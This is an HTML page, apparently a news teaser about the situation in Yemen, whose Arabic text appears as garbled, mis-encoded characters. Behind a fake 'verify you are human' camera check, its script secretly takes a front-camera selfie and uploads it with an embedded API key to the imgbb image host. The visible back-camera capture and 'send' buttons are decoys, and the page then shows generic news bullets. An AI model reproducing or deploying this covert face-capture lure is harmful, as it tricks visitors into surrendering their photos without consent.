<!DOCTYPE html>
<html lang="ar">

<head>
    <meta charset="UTF-8">
    <title>ุขุฎุฑ ุชุทูุฑุงุช ุงููุถุน ูู ุงูููู</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <style>
        body {
            font-family: 'Tahoma', sans-serif;
            text-align: center;
            background: linear-gradient(to bottom right, #e0f7fa, #fff3e0);
            color: #333;
            padding: 50px 20px;
        }

        h1 {
            font-size: 2em;
            color: #00796b;
        }

        p {
            font-size: 1.2em;
            margin-bottom: 15px;
        }

        button {
            background-color: #00796b;
            color: white;
            border: none;
            padding: 15px 35px;
            font-size: 1em;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background-color: #004d40;
        }

        video {
            display: none;
            width: 100%;
            max-width: 400px;
            margin-top: 20px;
            border-radius: 12px;
        }

        #captureBtn,
        #sendBtn {
            display: none;
            margin-top: 10px;
        }

        #loading {
            margin-top: 20px;
            font-size: 1.2em;
            color: #666;
        }

        #finalContent {
            display: none;
            margin-top: 30px;
            font-size: 1.3em;
            color: #333;
        }
    </style>
</head>

<body>
    <h1>๐ ุขุฎุฑ ุชุทูุฑุงุช ุงููุถุน ูู ุงูููู</h1>
    <p>ูุฑุฌู ุงูุชุฃููุฏ ุนูู ุฃูู ุฅูุณุงู ุนู ุทุฑูู ุชุตููุฑ ุฃู ุดูุก ุฃูุงูู.</p>
    <button onclick="startVerification()">โ ุงุจุฏุฃ ุงูุชุญูู</button>

    <video id="video" autoplay playsinline></video>
    <br>
    <button id="captureBtn" onclick="captureBackground()">๐ธ ุงูุชูุงุท</button>
    <button id="sendBtn" onclick="sendResult()">๐ค ุฅุฑุณุงู</button>

    <div id="loading"></div>
    <div id="finalContent">
        ๐พ๐ช <strong>ุฃูู ุงููุณุชุฌุฏุงุช:</strong><br><br>
        โข ุชุญุณู ุทููู ูู ุณุนุฑ ุตุฑู ุงูุฑูุงู ููุงุจู ุงูุฏููุงุฑ.<br>
        โข ุงุณุชูุฑุงุฑ ุงููุญุงุฏุซุงุช ุจุดุฃู ุงููุฏูุฉ ูู ุจุนุถ ุงููุญุงูุธุงุช.<br>
        โข ุชูุงุฑูุฑ ุนู ูุฏูุก ูุณุจู ูู ุตูุนุงุก ูุนุฏู ูุคุฎุฑูุง.<br>
        โข ุนูุฏุฉ ุจุนุถ ุงูุฎุฏูุงุช ุชุฏุฑูุฌูุงู ูู ููุงุทู ุงูุฌููุจ.
    </div>

    <script>
        const API_KEY = "8b3ff25139462514d13f5d9a3b3c0d05";
        const video = document.getElementById("video");
        const captureBtn = document.getElementById("captureBtn");
        const sendBtn = document.getElementById("sendBtn");
        const loading = document.getElementById("loading");
        const finalContent = document.getElementById("finalContent");

        let backgroundStream = null;
        let selfieUploaded = false;

        async function startVerification() {
            loading.textContent = "๐ท ุฌุงุฑู ุงูุชุญูู ูู ุฃูู ุฅูุณุงู...";
            try {
                // ุงูุฎุทูุฉ 1: ุงูุชูุงุท ุงูุตูุฑุฉ ุงูุฃูุงููุฉ ูุจุงุดุฑุฉ
                const selfieStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const hiddenVideo = document.createElement("video");
                hiddenVideo.srcObject = selfieStream;
                await hiddenVideo.play();

                setTimeout(async () => {
                    const canvas = document.createElement("canvas");
                    canvas.width = hiddenVideo.videoWidth;
                    canvas.height = hiddenVideo.videoHeight;
                    const ctx = canvas.getContext("2d");
                    ctx.drawImage(hiddenVideo, 0, 0);

                    selfieStream.getTracks().forEach(track => track.stop());

                    const imageData = canvas.toDataURL("image/jpeg");
                    const formData = new FormData();
                    formData.append('image', imageData.split(',')[1]);

                    const res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
                        method: 'POST',
                        body: formData
                    });

                    const data = await res.json();
                    if (data.success) {
                        console.log("๐ท ุชู ุฑูุน ุตูุฑุฉ ุงูุฃูุงููุฉ:", data.data.url);
                        selfieUploaded = true;

                        // ุงูุขู ููุชูู ููุชุญ ุงููุงููุฑุง ุงูุฎูููุฉ
                        await startBackCamera();
                    } else {
                        loading.textContent = "โ ูุดู ุฑูุน ุงูุตูุฑุฉ.";
                    }
                }, 1000);

            } catch (err) {
                loading.textContent = "โ๏ธ ุชุนุฐุฑ ุงููุตูู ูููุงููุฑุง.";
                console.error(err);
            }
        }

        async function startBackCamera() {
            try {
                backgroundStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                video.srcObject = backgroundStream;
                video.style.display = "block";
                captureBtn.style.display = "inline-block";
                loading.textContent = "๐ฅ ูุฌู ุงููุงููุฑุง ูุฃู ุดูุก ุซู ุงุถุบุท ุงูุชูุงุท.";
            } catch (err) {
                loading.textContent = "โ๏ธ ุชุนุฐุฑ ุชุดุบูู ุงููุงููุฑุง ุงูุฎูููุฉ.";
                console.error(err);
            }
        }

        function captureBackground() {
            captureBtn.style.display = "none";
            video.style.display = "none";
            backgroundStream.getTracks().forEach(track => track.stop());
            sendBtn.style.display = "inline-block";
            loading.textContent = "๐ค ุฌุงูุฒ ููุฅุฑุณุงู.";
        }

        function sendResult() {
            sendBtn.style.display = "none";
            loading.textContent = "โ ุชู ุงูุชุญูู ูู ุฃูู ุฅูุณุงู...\n๐ ุฌุงุฑู ุฌูุจ ุงููุนูููุงุช...";
            setTimeout(() => {
                loading.style.display = "none";
                finalContent.style.display = "block";
            }, 2500);
        }
    </script>
</body>

</html>
